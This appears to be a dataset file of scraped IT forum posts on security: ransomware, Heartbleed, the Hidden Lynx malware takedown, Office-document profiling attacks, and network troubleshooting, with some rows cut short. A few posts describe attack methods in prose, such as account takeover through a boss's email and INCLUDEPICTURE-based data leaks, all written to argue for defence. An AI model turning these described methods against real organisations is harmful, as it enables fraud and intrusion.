company? Or another company trying to make some money off the security industry?What’s their income modelThis is a touchy subject for many organisations out there. Does the company actually have an income model based around actually making your company more secure? Or do they simply want you to feel as if you’re more secure by writing huge reports designed simple to keep a regulatory body off your back?Track record not personalitiesDoes the consultancy have a track record in delivering the type of security you’re specifically after? Or is it a consultancy solely built around a personality? It’s not to discredit infosec personalities in any way, shape or form. But unless that personality will be delivering the consultancy themselves, it’s highly unlikely that you’ll receive any advice close to the level you’ll be charged for.Follow fadsCheck up on their research. Is the consultancy chasing after virtualisation one year and smart phones the next? Are they always looking over the horizon at the next emerging fancy threat, without having enough time to fix today’s bugs? Do their service offerings change depending upon that weeks press releases?Keeping it simpleDoes the consultancy continually publish all these papers about how to protect yourself from these super-advanced techniques and exploits that very few people can actually develop, and most hackers will NEVER USE. It’s the simple stuff that works now, and will continue to work years into the future. Security need not be complicated.Understand the limitsYou cannot outsource blame. You HAVE to take responsibility for your organisations mistakes. Whether they be IT mistakes, vendor mistakes, even mistakes made by your most trusted employees. These are all security choices. You don’t have to be an expert in security, you just have to make informed decisions to control your organisation.﻿",0

2159908,Need Recommendations on an NVR Machine for Cameras,Ok...so we are installing security cameras onsite at our main campus (we are a church). We already have the cameras and they are clear and don't have any issues. We are running Blue Iris and I like the software. It's easy to use and fairly simple to set up. It has WAY more options than I need to use.Here's where my issue is:The machine that we have is under powered. As I add cameras or a camera is triggered the CPU spikes and the machine is unusable until it is finished. I only have 21 cameras physically installed and only half of those configured in the software.The machine is an HP workstation class box with an i3 processor. It has 8GB memory and we purchased a WD purple 4TB drive for the footage (we would install that in any machine we use).My question is what's recommended for a suitable machine? I can continue to throw memory in it but it may not be enough when it is maxed out. The machine I have is way above the BI specs so those are not any help.I do not have anything else on the network interfering with the cameras as we have moved the machine and all cameras to a dedicated switch that is internal to the building only.I don't want to try something and keep trying until it's right. That could get really expensive. I would rather do research now and make a purchase that's going to do the job. Any suggestions would be greatly appreciated. Thanks in advance.,0
2136195,MSPs: Three Pillars Of Security To Remember In The Fight Against Ransomware,"Ransomware is an ongoing threat to businesses of all sizes in every industry. And ransomware “hackers” are moving to more professional operations that closely mimic technology businesses. In the first half of 2017 alone, a whopping 1.9 billion data records were either lost or stolen due to cyberattacks. As the cat and mouse game between security vendors and those on the dark side of the web continue, what happens to small-to-mid-sized businesses (SMBs) that may not have the resources, tools or training that larger organizations use to recognize, prevent and protect themselves from such attacks.RELATED CONTENT: Global Security Report 2018: Ransomware as a business explodesManaged service providers (MSPs) can help these companies gain an in-depth understanding of the current threat landscape and determine the most effective security strategies and solutions to prevent breaches and protect critical data. These service providers can also help companies comprehend the significant financial impact of an attack. The average cost of a security breach for SMBs is $47,000.How can MSPs help?So, how can MSPs help their clients defend against ever-growing sophisticated threats and improve security? Here are three important pillars to improving security:Staff educationA security software suiteData backup and recovery solutionsPillar 1: Protecting the Front Line: Staff EducationThe weakest link in any business is the staff, so the first line of defense is education. MSPs can help train staff on social engineering techniques, giving employees the tools to make informed decisions about emails and web content, and protect data and systems.Pillar 2: Safeguarding Against Ransomware: Recommending a Security Software SuiteIn addition to training, clients also will need to protect themselves against web-based malware attacks using software-based security solutions. Companies should implement a security suite that covers risk factors from multiple types of attacks and liabilities.Pillar 3: Business Continuity: Determining data backup and recovery solutionsThe third step where MSPs can help clients with a layered-security approach is to build strategies around data backup and recovery.Partnerships for Secure ClientsMSPs can play a critical role in helping clients stay ahead of the risks and better safeguard their businesses. AppRiver and Datto created a complimentary whitepaper titled, “The MSP’s Guide to Protecting Clients from Ransomware“ to advise MSPs on how they can help SMBs deploy a nearly bulletproof security solution to protect their business from threats on multiple fronts.

1632090,Why your boss is his/her own worst enemy: A discussion on User Security,"So, there have been a good number of posts on Spiceworks about ""My boss demands access to everyone's email 24/7"" or ""My boss wants all the user passwords and they'll never be changed!"".Fundamentaly, we know this is wrong. A terrible practice and against all sound security recommendations.  But translating that into business speak can be daunting.  Especially for a new in the field 1 man shop or a SysAd pulling ITD duty and has never had exposure to say the risk and liability law resources.  (Seriously, if you learn one thing from any of my posts ever, learn to love your corporate counsel if you have one.  When you to combine, it's like Voltron!)For our example, lets use SpiceRex Bread and Rolls Bakery.  It's a Privately Held middle-man baked goods supplier.  No front end store, deals to distributors and restaurants.  100 employees.  Does say $20M USD a year.  SRBRB has business insurance including fraud, theft, destruction and a cybercrime rider.And while there's a CFO, CEO, COO, the IT department of course is 2 guys.  1 Guy who does the IT for the manufacturing stuff, the other guy does the end-user professional types.  Both are very competent and the place loves them.  COO pulls them aside and explains how he was having lunch with another SMB COO and they were discussing how THAT guy has access to anything his people do because he has their logins.  And it's how they caught someone skimming milk from the milk harvesters! (Apparently, it's a dairy farm.)  And that sounds like a great thing to have here!  What if someone was stealing milled flour?!  MY GOD!  Of course, the two IT folks explain FAR better ways to accomplish that, however, to the COO it just sounds ""like more work and wouldn't MY way be easier?""  And you can tell he's about to pull the ""I'm the COO, just do it my way"" trigger.  Each IT guy looks to the other demanding the other one think of ""SOMETHING!""Behold!  This thread!  Figured between an entire community of IT pros, some of us should have had risk / liability mitigation argument examples to throw at the non-IT bosses.Caveat:  Always, always, ALWAYS run all of this by counsel.  We're IT pro's and some of us have access to counsel, but that does NOT make us counsel by any stretch of the imagination.  1.  If you're not following ""Best Practices"" or the requirements spelled out by your Cyber Insurance, it is very possible any event that would normally be covered will now be refused by the insurance agency because your company failed to do its due diligence for common security.2.  Corporate Account Takeovers.  When you Accounts Payable / Accounts Receivable lady visits some site that gives her malware / keylogger and they then breach your bank account using stolen credentials?  Yea.  Banks are fighting those HARD.  They will tell you to contact your insurance company, as federal insurance does NOT cover corporations.  And that REALLY sucks when they stole payroll for this month....2a.  This becomes a BIGGER risk when your boss has unmitigated, untraceable access to such accounts.  If I get my hands on your boss' account list, or maybe even their email, I can just start bouncing around willy nilly.  Password list is the worst, but email isn't far behind.  I crack open your boss' email because his password was his last name, all lowercase, and he has access to everyone's email?  Fantastic!  Now I just try to find out who the Accounts person is.  Odds are, they have a tell tale email to tell me what bank they use.  Do an account restoration when everyone's asleep, by the time they wake up, thanks boss, no one is getting paid because you did poor man's paranoia policy.3.  In some countries, in which you only need to do business with, doing so is an absolute no-no.  4.  This is less of a Risk / Mitigation but more of an HR consideration.  IT walks around asking for everyone's password, everyone is going to think Executive Witch Hunt and the place of work is going to become really awful, really quick.5.  IT becomes the default scapegoat.  YOU collected the passwords.  YOU knew where they were stored.  YOU had access.  The COO would NEVER do anything wrong.  It was THOSE IT guys.  They were upset when I first mentioned the policy.  It MUST HAVE been then.  (I have literally seen that happen once.  It was literally the biggest farce on the planet.)Those are my initial thoughts and examples.  Anyone else?",0

1381222,Should you invest in cyber security?,"Short answer: Yes!According to New York Post, brokers especially could face stiffer fines in 2016 if they don’t implement proper cyber security to protect their clients’ data.

Yikes!Robert Ketchum of FINRA states that “The sophistication of the attacks today are greater and the range of the commonality of the attacks are increasing.”Even if you aren’t a broker, it’s important to stay ahead of the cyber threats out there. Employees and clients alike can face a multitude of threats if they aren’t paying attention. In order to remain compliant with FINRA, firms must maintain their security posture, including: •Maintaining security and confidentiality of customer records and information•Protect against potential threats to the security or integrity of customer records and information•Defend against unauthorized access to private company and customer information that could result in substantial hard to the customer﻿So… What are you doing in 2016 to stop cyber threats in their tracks and remain compliant?",0

473203,Heartbleed in OpenSSL; A message from Symantec's VP of Trust Services,"Yeah...it really is as bad as They are making it out to be.  We dropped a little bit of science on the Community yesterday with a blog from one of our top researchers Dick O'Brien.  Today we're back with more knowledge from Symantec Vice President of Trust Services Tom Powledge.  Dig it:﻿﻿Heartbleedin OpenSSL: Take Action Now!This week a vulnerability dubbed “Heartbleed” was found inthe popular OpenSSL cryptographic software library (http://heartbleed.com).  OpenSSL iswidely used, often with applications and web servers like Apache and Nginx.  OpenSSL versions 1.0.1 through 1.0.1f contain this vulnerability,which attackers can exploit to read the memory of the systems.  Gainingaccess to the memory could provide attackers with secret keys, allowing them todecrypt and eavesdrop on SSL encrypted communications and impersonate serviceproviders. Data in memory may also contain sensitive information includingusernames and passwords.Heartbleed is not a vulnerability with SSL/TLS, but rather asoftware bug in the OpenSSL heartbeat implementation. SSL/TLS is not broken; itis still the gold standard for encrypting data in transit on the Internet.However, due to the popularity of OpenSSL, approximately 66% of the Internet ortwo-thirds of web servers (according to NetcraftWeb server report ) could be using this software. Companies usingOpenSSL should update to the latest fixed version of the software (1.0.1g) orrecompile OpenSSL without the heartbeat extension as soon as possible.As the world’s leading Certification Authority, Symantec hasalready taken steps to strengthen our systems. Our roots are not at risk;however, we are following best practices and have re-keyed all certificates onweb servers that have the affected versions of OpenSSL.After companies have updated or recompiled their systems,Symantec is recommending that customers replace all their certificates-regardless of issuer- on their web servers to mitigate the risks of securitybreach. Symantec will be offering free replacement certificates for all our customers.  Finally, Symantec is asking customers to reset passwords totheir SSL and code-signing management consoles.  Again, this is a bestpractice and we encourage companies to ask their end customers to do the sameafter their systems have applied the fix.  We will continue to work withour customers to minimize the impact of security risks from this vulnerability.For your convenience, here is a summary of steps to take:For businesses:Anyone using OpenSSL 1.0.1 through1.0.1f should update to the latest fixed version of the software (1.0.1g), orrecompile OpenSSL without the heartbeat extension.  Businesses should also replace thecertificate on their web server after moving to a fixed version of OpenSSL.Finally, and as a best practice,businesses should also consider resetting end-user passwords that may have beenvisible in a compromised server memory.For consumers:Should be aware their data couldhave been seen by a third party if they used a vulnerable service provider.Monitor any notices from thevendors you use. Once a vulnerable vendor has communicated to customers thatthey should change their passwords, users should do so.Avoid potential phishing emailsfrom attackers asking you to update your password – to avoid going to animpersonated website, stick with the official site domain.That's the latest.  Stay tuned because you KNOW there is more coming.  Our crew is working overoveOVERtime on this.Keep us close.",12

I would like to save some money here not using third party antivirus software and maybe to use the Built-In AV that Microsoft provides. It looks like I'm able to use Microsoft Intune administration console to manage Windows 10 Defender across the network.I would like to hear your thoughts on this?",5

1069144,How to stop CryptoWall 3.0?,"Greetings,We have been hit by CryptoWall 3.0 two times in the last month. We utilize Citrix and have redirected folders (roaming profile of sorts) for user stuff. Each time we got hit, it seemed to be through the Citrix session. After the fact, we saw an EXE file in the redirected folder AppData folder.We have heard of ways of preventing EXEs to run in the AppData folder and are looking into ways of implementing it through group policy currently. We are also considering disabling Flash. (We do keep Java and Flash up to date).We use Trend Micro Worry-Free Business Security Advanced and it did not stop it. We also have Barracuda Web filtering, along with Barracuda spam filter. The user who brought it in said he had not opened any email attachments.So what is the best way to try to stop this from happening aside from pulling the plug on the internet itself? Any suggestions or opinions?Thanks much,- Matt",0

558672,Ransomware: The next 12 months. Help me predict?,"Hi all, I was asked for a write-up what ransomware would do the next 12 months for a whitepaper. Can you have a look and see if I forgot anything?  Thanks in advance !!Stu Since September 2013, ransomware has become vicious and has inspired several copycats. At the time of this writing, summer 2014, the very first strains of second-generation ransomware have been identified. The five reasons that these strains are called second generation are:They use the TOR network for their Command & Control (C&C) servers which makes them much harder to shut down.Traffic between the malware that lives on the infected machine and its C&C servers is much harder to intercept.Second-gen ransomware uses super strong cryptography which makes decrypting it yourself impossible.Compresses files before encrypting them.Second-gen ransomware is built as commercial crimeware, so it can be sold globally to other cybercriminals. It Bitcoin ransom amounts that the ""customer"" can specify and a choice of which files types will be encrypted, so that the criminal can compete and differentiate themselves.What can be expected in the next 12 months?Second-gen ransomware will proliferate, several large (and competing) Eastern European cyber mafias will be big players in this field, followed by dozens of smaller operations spread all over the planet that buy ""pay-and-play"" commercial ransomware.Ransomware will expand beyond the Windows platform onto Apple's devices. Being hit with a ransom demand to unlock your iMac, iPhone or iPad will be likely to occur frequently mid 2015. Similarly this will be the case for the Android OS, which runs on both phones and tablets, and likely in much higher volume than Apple devices.Criminal RaaS (Ransomware-as-a-Service) subscriptions will be available, where would-be cyber criminals can buy all the required elements needed for an attack. These RaaS subscriptions comprise of available potential victim email lists, phishing templates that use successful social engineering ploys, bulletproof email servers (or botnets) to send the attacks, the malware that includes encryption / decryption features and last but not least the financial infrastructure that allows victims to pay.The vast majority of these attacks will be launched from countries that do not have legislation (or insufficient enforcement) to stop this kind of attack, with the result that U.S. law enforcement will continue to be severely challenged to do something about these attacks and is forced to continue the whack-a-mole game.Infection vectors will continue to be more creative and hard to defend against. At the moment, links to cloud storage are being used to social engineer people so they open up zip files, but it is likely that this will follow the same pattern as phishing and that drive-by ransomware infections will be the norm. Visiting a legit website that has been compromised and clicking on a link will be enough to encrypt the files on the workstation and/or the file server.In general over the next year, ransomware attacks will technically get more sophisticated and be able to evade normal detection methods like antivirus and sandboxing technologies. ""With target audiences so large, financing mechanisms so convenient, and cyber-talent so accessible, robust innovation in criminal technology and tactics will continue its surge forward in 2014,"" said Vincent Weafer, senior vice president of McAfee Labs.(*) ""The emergence and evolution of advanced evasion techniques represents a new enterprise security battlefront, where the hacker’s deep knowledge of architectures and common security tactics enable attacks that are very hard to uncover."" (*) Source: McAfee Labs 2014 Predictions ReportLooking at these expected developments, it is a necessity to step end-users through effective Security Awareness Training and prevent ransomware infections before they cause downtime and/or lost intellectual property.

986026,"Could ""protection in numbers"" make employees a security gem?","I'm curious to gather SpiceHeads' thoughts on this idea: What if employees as a ""force in numbers"" were considered to be an asset to security rather than a downfall? This might sound completely crazy but think about human nature. Humans will react as their peers do. If employees had a way to alert an entire organization about a possible imminent attack that they encountered... wouldn't that put the entire workforce on high alert? Attackers are crafty. They're moving quicker than ever and they know that employees can be an in to an organization's information. In a day and age where IT is so aware of security threats, it may be time for the IT Pros get crafty in thinking about how to stop attackers. With this, does employees as protection in numbers sound so crazy? Do you think this would be adoptable at your organization?

It has worked fairly nicely for our Firewall needs, but the Anti-Spam features Sonicwall has leaves much to desire as we have some users getting upwards of 30-40 emails that come through as [Likely-Spam] that are clearly Spam, but if we up the Spam filters we have too many legit emails being blocked. We work with multiple countries, and get roughly 70,000 emails sent to us in a month. I am not the biggest Firewall/Email guru, but I am a 1-man shop when it comes to IT here.

604680,Security vendors take action against Hidden Lynx malware,"I believe it was Claudius in Hamlet who remarkedWhen sorrows come, they come not single spies...But in battalions﻿Lots going on this week between DropBox, more breaches...the Windows 0-Day OLE packager vulnerability...  It's enough to Unite the Clans!  Wait...what?  Dig it:Security vendors take action against Hidden Lynx malware﻿A coordinated operation involving Symantec and a number of other security companies has delivered a blow against Backdoor.Hikit and a number of other malware tools used by the Chinese-based cyberespionage group Hidden Lynx. Dubbed Operation SMN, this cross-industry collaboration has seen major security vendors share intelligence and resources, resulting in the creation of comprehensive, multi-vendor protection which may significantly blunt the effectiveness of this malware. The organizations involved in this operation include Cisco, FireEye, F-Secure, iSIGHT Partners, Microsoft, Symantec, ThreatConnect, Tenable, ThreatTrack Security, and Volexity.The Hikit back door has been used in cyberespionage attacks against a range of targets in the US, Japan, Taiwan, South Korea, and other regions. Attackers using Hikit have focused their energies against organizations associated with the government, technology, research, defense, and aerospace sectors among other targets.Operation SMN is the first time a cross-industry group has come together to disrupt an advanced persistent threat (APT) group. Previous collaborations, such as operations against the gangs behind the Gameover Zeus and Shylock Trojans, have usually been focused on cybercriminal gangs.Coordinated by security firm Novetta under Microsoft’s new Coordinated Malware Eradication program, Operation SMN has resulted in a significant amount of intelligence being shared among vendors, leading to the rollout of more effective protection against Hikit and a number of other associated pieces of malware, including one previously unknown malware tool.HikitThe main target for this operation was Backdoor.Hikit, a sophisticated and stealthy remote access Trojan (RAT) which has been used in high profile attacks since 2011. Hikit provides the attackers with a back door on the victim’s computer. It enables them to download information from the infected computer and upload commands and other malware.Network-tunneling capabilities allow the threat to create proxies, while an ad-hoc network generation feature allows it to connect multiple compromised computers to create a secondary network. Hikit comes in 32-bit and 64-bit versions, which are deployed depending on the target’s infrastructure.Hikit has been used by at least two Chinese-based APT groups to launch cyberespionage attacks: Hidden Lynx and Pupa (also known as Deep Panda). Whether the groups are related in some way or whether they simply have access to the same malware tools is currently unknown.Hidden LynxHidden Lynx, also known in the industry as Aurora, is a highly capable and well-resourced group of attackers that is based in China. The group has a track record of mounting relentless and persistent attacks against a broad range of targets.Symantec has carried out extensive research on Hidden Lynx and has concluded that the group has between 50 and 100 operatives at its disposal and is capable of carrying out hundreds of simultaneous attacks against diverse targets. Given its broad focus, the group appears to operate as a “hackers for hire”-type operation, mounting attacks on demand as directed by its paymasters.Hidden Lynx is regarded as one of the pioneers of the “watering-hole” attack method and it appears to have early access to zero-day vulnerabilities. If it cannot mount direct attacks against a target, Hidden Lynx has the capabilities and the patience to work its way up through the supply chain, compromising the security at companies that are suppliers to the target organization and using them a stepping stone towards the ultimate goal.Hidden Lynx used Hikit during its compromise of Bit9’s trusted file-signing infrastructure in 2012. This attack was then leveraged to mount the VOHO campaign in July 2012 using Bit9-signed malware. The ultimate target of this campaign was US companies whose computers were protected by Bit9. Hikit once again played a key role in this attack campaign.Since then, Hidden Lynx has continued to use Hikit in its attacks against organizations predominantly in Taiwan, the US, Japan, and South Korea. In 2013, Hidden Lynx underwent a significant re-tooling effort, introducing two new malware tools, Backdoor.Fexel and Backdoor.Gresim, which it continues to use in conjunction with Hikit. Backdoor.Gresim was undiscovered prior to this collaboration effort.This is the first time that a significant effort to disrupt the activities of an APT has been made. Symantec welcomes the work between industry partners to share intelligence and coordinate efforts to provide the maximum impact against APT groups. Through effective collaboration, we can help ensure that any organization likely to be targeted by these groups will be better protected in the future.  Symantec protectionSymantec has the following detections in place for the malware used in these attacks:AVBackdoor.HikitBackdoor.Hikit!gen1Backdoor.FexelBackdoor.GresimInfostealer.DerusbiTrojan.NaidTrojan.Naid!gm2Trojan.Naid!gen1Backdoor.MoudoorBackdoor.ZXShellBackdoor.DarkmoonIPSSystem Infected: Backdoor.Hikit Activity 2System Infected: Backdoor.Fexel Activity 3System Infected: Gresim ActivitySystem Infected: Backdoor.Fexel ActivitySystem Infected: Infostealer.Derusbi ActivitySystem Infected: Trojan.Naid Activity 2System Infected: Moudoor Backdoor ActivitySystem Infected: Backdoor DarkMoon Activity﻿I'll keep the news coming as fast as it happens.  Holler if you need anything.¡﻿VIVA!",11

456331,5 Security Software Myths That Can Prove Dangerous,"﻿http://www.makeuseof.com/tag/5-security-software-myths-can-prove-dangerous/﻿While the media doesn’t pay as much attention to malware as it did a decade ago when the threat was new, tens of millions of PCs remain infected worldwide. Some are damaged by their infection and become unstable, others allow criminals to steal private information, and still others force the target to join a botnet.You’d think such threats would make people take malware more seriously, but many myths persist. Here are five common misconceptions that can lull you into a false sense of security.A Virus Can’t Infect Your PC If You Don’t Download AnythingMost people think of a virus as a malignant executable that runs harmful code and, as such, come to the conclusion that malware is only a problem for people who download sketchy files. In fact, this perception is well over a decade out of date, and can leave those who hold it vulnerable to a wide variety of threats.The computer worm, a self-replicating virus that spreads itself through vulnerabilities in its victim’s software or operating system, is a prime example of malware that can infect its victim without the user knowing. Worms sneak into target PCs by using a loophole or bug. In most cases the vulnerability can be found in software, but sometimes it can be found in firmware;some Linksys routers, for example, are vulnerable to a worm that can infect the router remotely.Even if worms didn’t exist, there are other avenues of attack. Hackers sometimes attack legitimate sites and sneak a virus onto them, opening up a wealth of targets who presume the site in trustworthy. A website may cause no harm for years then, without warning, become an avenue of attack.The lesson is simple; install an antivirus on your PC, even if you visit a small selection of sites that you trust.My Computer Runs Fine, So An Antivirus Will Slow Me DownUsers who think that they can protect themselves without an antivirus also tend to believe they’re not infected because their PC seems to run fine. And why not? Hollywood has convinced many that a virus throws up laughing skulls or a picture of Calvin pissing on a PC; at the very least, the Task Manager should show excessive processor usage. Right?Wrong. While it’s possible to detect some viruses without an antivirus, many others try to leave no trace. This is true with some botnet malware, which tries to obscure its access to the infected PC’s resources, and also true of keyloggers and Trojans that seek to obtain a user’s personal information.Want proof? Read Ars Technica’s article on “ratting,” which exposed a voyeuristic subculture based on tools that make it possible to spy on people via webcam without the victim knowing. The “ratters” even discover and discuss ways to disable the light which most webcams activate when in use, thus disabling a security feature many users think impossible to defeat.While it’s true that an antivirus will put some strain on your PC, it’s unlikely to be so much that you’ll notice; most use less than a hundred megabytes of memory while running in the background, and processor usage is generally low unless you’re running a full system scan. And, since you have the antivirus install, you can rest easy knowing there’s no malware trying to trick you into thinking your PC is fine.All Antivirus Apps Are The SameThere are a lot of antivirus apps to choose from, and choosing between them can be confusing. Perhaps it’s no surprise, then, that some users throw up their hands and declare all of them to be more or less the same.Nothing could be further from the truth. According to AV-Test, an independent organization that tests antivirus software, security suites that score poorly detect and protect against up to 20% fewer zero-day attacks and 15% fewer “known” threats. Put simply, choosing the wrong antivirus can leave you vulnerable even to common malware.While paid security suites tend to perform better than those that are free, some no-cost options, like Avast and AVG, hold up well. The rankings can vary significantly from year to year, however, so you should read AV-Test’s latest results before deciding which suite to download and/or purchase.I Don’t Run Windows, So I Don’t Need An AntivirusExcluding mobile operating systems for tablets and smartphones, Windows still owns about 90% of the global computing market, so it’s no surprise it remains a prime target for malware. That doesn’t mean other operating systems are perfectly safe, however, as they too can prove easy pickings.Mac OS X, which takes up about 6% of the global market, has become the victim of numerous attacks over the last few years; one, discovered in 2012, infected 600,000 computers. While this is still limited in scope compared to even moderately successful Windows malware, it proves that Macs are not invulnerable, and users are often ill-prepared to handle an infection because they believe OS X to be safe.Even Linux can be infected. Don’t just take our word for it; read the Linux Foundation article on malware, which points out that no computer is absolutely impervious to attack.Malware Won’t Target Me, Because [Insert Reason Here]Some users, for various reasons, decide they don’t have to worry about malware because…reasons. Those reasons range from “my computer is too slow” to “I don’t buy anything online.” I even once eavesdropped on a passer-by who declared, in reference to malware, “That doesn’t worry me, there’s nothing in my checking to steal!” Queue the laugh track.Here’s the thing; malware is a program. Like all programs, it does what it’s programmed to do; nothing more or less. If malware is programmed to spread via an old Windows XP networking vulnerability and, once it infects a target, set up a keylogger, then that’s what it will do every time. A virus doesn’t care about your credit score.Even if you rarely use your computer for “important” things, like purchasing items or paying bills, malware can cause problems. As mentioned previously, there are thousands of people who use relatively simple tools to spy on people infected with a Trojan via their webcam. A keylogger can also pick up information related to your email or social network accounts which, even if not used to target you specifically, could be sent to or sold to illegitimate organizations looking to send spam from compromised accounts.In short, you don’t have the luxury of opting out from malware. And to make matters worse, it’s harder to rely on antivirus after malware is installed, because the malware might prevent the antivirus from working properly. Stay safe; get an antivirus now, rather than after you think you’re infected.ConclusionMalware a threat many people fail to take seriously until it’s too late. A user can go for months, maybe years without being infected; but when it takes root, it’s difficult to remove even when detected. That’s why it’s important to forget the myths and protect yourself with an antivirus immediately.Image credit: Shutterstock, AVG Technologies",12

Typical rogues are annoying, but relatively easy to take care of. Previously, all you had to do was boot into safe mode with networking and remove the files and registry entries (or install Webroot). Support forums everywhere use safe mode with networking as the “go to” mode for virus removal as non-core components are not loaded at start up and it’s easier to isolate problems. In the vast majority of the rogues we see, they are not loaded in the few modules which start up in safe mode. Antivirus System does, however, and it also applies some new and improved social engineering tactics to fool you into thinking it’s a real program trying to help you.Read the full report here: http://blog.webroot.com/2013/07/17/new-rogue-antivirus-system-locks-you-out-of-safe-mode/",0

2140216,Very poor throughput when using a VPN over bonded VDSL connection,"HelloWe have recently had installed a bonded internet connection (two 80/20 VDSL connections).  When performing a regular internet speedtest, I'm getting around 120Mbps down, and around 18Mbps up.  However, when creating VPNs to two different sites the throughput I get (over the VPNs) is around 5 or 10Mbps.  The provider of the bonded connection insist they are doing nothing to throttle any kind of traffic. We are using a SonicWall NSA 2600.  The same device is at one of the other ends of the VPNs, and the other site is an AWS account.  In either case, to the AWS account, or the other NSA 2600, the throughput is very low.  I have tried different MTUs on the bonded connection's SonicWall interface with no change.Does anyone have any experience with similar scenarios, or any suggestions?ThanksPaul",0

2053777,Phishing attacks use undocumented MS Office feature to leak system profile data,"An undocumented Microsoft Office feature allows attackers to gather sensitive configuration details on targeted systems simply by sending a phishing email and social engineering victims to open a specially crafted Word document—no VBA macros, embedded Flash objects or PE files needed.The undocumented feature is being used by adversaries, according to Kaspersky Lab researchers, as part of a multistage attack that first involves gathering the system configuration data on targeted systems.“This code effectively sent information about the software installed on the victim machine to the attackers, including info about which version of Microsoft Office was installed,” wrote Kasperky Lab researchers in a blog post Monday explaining their research.The feature is present in Word for Windows as well as on Microsoft Office for iOS and in Microsoft Office for Android. Researchers say they have observed several spear phishing campaigns containing the malicious attachments that are laying the groundwork for future attacks using this technique.“To ensure a targeted attack is successful, intelligence first needs to be gathered, i.e. the bad guys need to find ways to reach prospective victims and collect information about them. In particular, they need to know the operating system version and the version of some applications on the victim computer, so they can send it the appropriate exploit,” researchers said.Emails in the phishing campaign contained Word documents in OLE2 (Object Linking and Embedding) format. OLE allows authors to embed objects and link to multiple resources or other objects in a single Word document. Using it can allow an author to create a field in a document that “points” to the graphic file as opposed to simply embedding the graphic file, for example.When researchers looked closer at the underlying code behind questionable Word attachments that were part of the phishing campaign they found the field “INCLUDEPICTURE” that was using Unicode as part of its instructions and not ASCII format as it should have.Using that Unicode framework, hackers were able to manipulate the code to trigger GET request to malicious and obfuscated URLs contained within the underlying code of the very same Word document attachment. Those links then pointed to PHP scripts located on third-party web resources. “As a result, the attackers received information about the software installed on the computer,” they said.Researchers identified the undocumented Microsoft feature only as INCLUDEPICTURE field. “Microsoft Office documentation provides basically no description of the INCLUDEPICTURE field,” they said. “This is a complex mechanism that the bad guys have created to carry out profiling of potential victims for targeted attacks.In other words, they perform serious in-depth investigations in order to stay undetected while they carry out targeted attacks,” Kaspersky researchers said. They said there is nothing suspicious about the Word document at first glance, just Google search tips.Another excellent reason to train your users...",11

Please feel free to weigh in with any life saving tips at any time.Thoughts:Does the cryptolocker require admin privileges, or does it escalate no matter what?Shouldn't there be a way to disable the encryption ability of a computer? Like turning off EFS or BitLocker. Does the virus bring its own ability to encrypt or piggy back on yours?Would an early detection system be feasible? Like something as simple as a batch file comparing the value of a ""bait file"" to that of a stored variable. When the two values don't match the batch file automatically sends email and shuts down the machine. Eh?I have read up that the reason it is so effective is that the private key never exists on your computer. A mistake of predecessor viruses, which lead to their own demise. These means that they have to communicate with CryptoLocker servers, is there a list of these servers to block some how?I read somewhere that pre-ecrypted file systems cannot be re-encrypted.

2104778,Upload Bandwidth Issue Fortigate 60D,"I have a FG 60D running v5.2.13 firmware. We have just had a 20/20Mpbs fibre link installed and I am noticing that we are getting  reduced uploads speeds, about 15-25% of what I would expect. I have followed the following troubleshooting steps which have resulted in several assumptions.Connected the ISP supplied Cisco 800 Series and confirmed that i get close enough to 20/20 speeds. This rules out the NTU and the WAN link.Connected directly to the LAN port on the Fortigate. The problem still exists with 19/4 speeds. This rules out the switches, cables and WAP's.Checked duplex settings on the Fortigate and connected NICs and confirmed all set to auto and negotiating correctly. This rules out a dupex problem although I was sure this would be the cause. Updated to the latest firmware.I have implemented the traffic shaping in accordance with the ISP's recommendations and tested to confirm the policies are applied.Remove all UTM features from policies and tested. Problem persists.Where it gets interesting is that if I configure the traffic shaping to 1000Kbps (up and down) and run a speed test I still see uploads at a significantly slower rate. In the above example it was around 0.95/0.2 Mbps. This to me would be an indication that it s now a performance problem with the FG.This issue may have been present since we have had the device as the previous WAN link was an ADSL service so the difference would have gone unnoticed. Any ideas? Does the ratio look familiar to anyone? Nick",0

Fortunately, the database was taken offline within a week of the researcher contacting Veeam about the server.Hacker Group Breaches British AirwaysAfter last week’s reveal of the data breach affecting nearly 380,000 of the airline’s customers, it was discovered that the injection methods used were the work of known hacker group MageCart. By compromising third-party actors, the group can access hundreds of sites and begin passing any customer payment information back to their own systems. Even more toublesome, this particular attack appeared to be tailored for the British Airways systems specifically, but could very likely be readjusted for other applications.Chinese Hackers Using Digitally Signed Drivers for AttacksA long-active hacker group likely based in China has expanded their tactics to include a seemingly innocent network filtering driver (NDISProxy) to start their latest malware campaign. The driver itself has a signed digital certificate from a Chinese-based security software company, which was likely unaware their certificate was being misused. By injecting itself silently across the infected network, the fully functioning remote access Trojan can be used to execute malicious tasks with ease.Scam Calls Causing Mobile Traffic JamThe number of scam calls recoreded by the call management firm First Orion rose nearly 1000% over the past year, from 3.7% of total calls last year to 29% so far in 2018.

1979844,Biometric Authentication Methods are Evolving: What method do you prefer?,"Password management is a ubiquitous problem. As discussed in our blog, according to a Gigya survey on user password habits, only 16 percent of consumers said they use a unique password for each online account, while six percent said they used the same password for all accounts and 63 percent said they use seven or fewer passwords across all accounts.Biometric authentication is increasingly viewed as a more secure alternative to traditional passwords and passcodes. For business users, it offers a quick way to unlock your mobile device or access accounts, without having to remember multiple, complex passwords. For IT leaders, it could help slow the continuous stream of password reset requests, and also provides options for two-factor authentication for those in regulated industries.In a recent blog we discuss which biometric authentication method is most secure in terms of the following options:Facial recognition is a fast and convenient way to access your device for personal use. The next step up is the fingerprint scanner, which has been integrated into high-end smartphones for several years. Finally, even more secure is the option of iris scanning.So SpiceHeads, whether it is something you use regularly yet or not, I'm curious -- taking both security and your own personal preferences into account, what is your preferred method of accessing your secure data, devices or accounts? Which biometric authentication method do you prefer; or if given the option, do you still prefer to stick with more traditional passwords? ",0

